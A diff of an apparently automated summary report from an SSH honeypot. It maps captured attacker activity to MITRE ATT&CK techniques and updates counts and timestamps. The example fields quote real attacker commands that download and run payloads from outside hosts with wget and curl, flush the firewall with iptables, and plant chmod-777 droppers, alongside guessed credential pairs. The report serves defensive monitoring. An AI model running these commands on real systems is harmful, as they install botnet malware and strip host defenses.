@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-12 04:03:11",
+  "generated": "2026-08-12 05:02:42",
   "totals": {
-    "commands": 352,
-    "login_failed": 892,
-    "login_success": 33,
-    "sessions": 983
+    "commands": 500,
+    "login_failed": 1047,
+    "login_success": 40,
+    "sessions": 1149
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 892,
+      "count": 1047,
       "examples": [
         "developer / developer",
         "git / 123",
@@ -21,14 +21,14 @@
         "root / 123456789"
       ],
       "first": "2026-08-12T00:00:08.927391Z",
-      "last": "2026-08-12T04:03:06.162429Z",
-      "unique_ips": 37
+      "last": "2026-08-12T04:52:41.875490Z",
+      "unique_ips": 44
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 101,
+      "count": 134,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -37,14 +37,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-08-12T00:23:36.347180Z",
-      "last": "2026-08-12T03:33:51.048289Z",
-      "unique_ips": 9
+      "last": "2026-08-12T04:54:39.866100Z",
+      "unique_ips": 12
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 72,
+      "count": 95,
       "examples": [
         "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://77.90.185.66/wget",
@@ -53,14 +53,14 @@
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh"
       ],
       "first": "2026-08-12T00:23:37.910058Z",
-      "last": "2026-08-12T03:33:51.046957Z",
-      "unique_ips": 11
+      "last": "2026-08-12T04:54:39.866100Z",
+      "unique_ips": 15
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 33,
+      "count": 40,
       "examples": [
         "root / founder88",
         "enable\\x00 / system\\x00",
@@ -69,21 +69,33 @@
         "root / root123456"
       ],
       "first": "2026-08-12T00:03:28.431265Z",
-      "last": "2026-08-12T03:33:47.236777Z",
-      "unique_ips": 21
+      "last": "2026-08-12T04:52:42.095599Z",
+      "unique_ips": 26
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 7,
+      "count": 9,
       "examples": [
         "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-12T00:23:37.910058Z",
-      "last": "2026-08-12T03:23:23.561876Z",
-      "unique_ips": 6
+      "last": "2026-08-12T04:52:44.674657Z",
+      "unique_ips": 8
+    },
+    {
+      "id": "T1057",
+      "name": "Process Discovery",
+      "tactic": "Discovery",
+      "count": 7,
+      "examples": [
+        "/bin/busybox ps; /bin/busybox ECCHI"
+      ],
+      "first": "2026-08-12T00:23:40.850044Z",
+      "last": "2026-08-12T04:52:42.326795Z",
+      "unique_ips": 1
     },
     {
       "id": "T1082",
@@ -102,16 +114,16 @@
       "unique_ips": 6
     },
     {
-      "id": "T1057",
-      "name": "Process Discovery",
-      "tactic": "Discovery",
-      "count": 5,
+      "id": "T1562.004",
+      "name": "Impair Defenses: Disable or Modify System Firewall",
+      "tactic": "Defense Evasion",
+      "count": 4,
       "examples": [
-        "/bin/busybox ps; /bin/busybox ECCHI"
+        "iptables -F"
       ],
-      "first": "2026-08-12T00:23:40.850044Z",
-      "last": "2026-08-12T03:23:26.538375Z",
-      "unique_ips": 1
+      "first": "2026-08-12T01:40:25.516032Z",
+      "last": "2026-08-12T04:43:12.519328Z",
+      "unique_ips": 4
     },
     {
       "id": "T1059.004",
@@ -137,18 +149,6 @@
       "first": "2026-08-12T01:08:06.828801Z",
       "last": "2026-08-12T03:33:47.240862Z",
       "unique_ips": 2
-    },
-    {
-      "id": "T1562.004",
-      "name": "Impair Defenses: Disable or Modify System Firewall",
-      "tactic": "Defense Evasion",
-      "count": 3,
-      "examples": [
-        "iptables -F"
-      ],
-      "first": "2026-08-12T01:40:25.516032Z",
-      "last": "2026-08-12T02:23:02.005120Z",
-      "unique_ips": 3
     },
     {
       "id": "T1037",
@@ -202,83 +202,83 @@
   "unmapped": [
     [
       "/bin/busybox",
-      51
+      102
     ],
     [
       "sh",
-      20
-    ],
-    [
-      "shell",
-      15
+      26
     ],
     [
       "/bin/busybox ECCHI",
-      15
+      21
+    ],
+    [
+      "shell",
+      19
     ],
     [
       "enable",
-      10
+      14
     ],
     [
       "system",
-      10
+      14
     ],
     [
       "linuxshell",
-      10
+      13
     ],
     [
       "ping ;sh",
-      9
+      12
     ],
     [
       "enablelinuxshell",
-      6
+      8
     ],
     [
       "busybox",
-      6
+      8
     ],
     [
       "cd /proc && cat self/cmdline",
-      6
+      8
     ],
     [
       "/bin/busybox cat /proc/mounts; /bin/busybox ECCHI",
-      5
+      7
     ],
     [
       "/bin/busybox echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon",
-      5
+      7
     ],
     [
       "rm /dev/.t; rm /dev/.sh; rm /dev/.human",
-      5
+      7
     ],
     [
       "cd /dev/",
-      5
+      7
     ],
     [
       "/bin/busybox cat /bin/echo",
-      5
+      7
     ],
     [
-      "/bin/busybox LZRD",
-      3
+      "/bin/busybox echo > /tmp/.fxcat && sh /tmp/.fxcat && cd /tmp/",
+      4
     ],
     [
-      "command -v python3 >/dev/null 2>&1 || (command -v apt-get >/dev/null 2>&1 && timeout 30 apt-get update -y; apt-get insta",
-      3
+      "/bin/busybox echo > /var/.fxcat && sh /var/.fxcat && cd /var/",
+      4
     ],
     [
-      "cat /tmp/bendi.py | python3 - ; rm -f /tmp/bendi.py",
-      3
+      "/bin/busybox echo > /var/run/.fxcat && sh /var/run/.fxcat && cd /var/run/",
+      4
     ],
     [
-      "rm -f /tmp/bendi.py",
-      3
+      "/bin/busybox echo > /var/tmp/.fxcat && sh /var/tmp/.fxcat && cd /var/tmp/",
+      4
     ]
   ]
 }
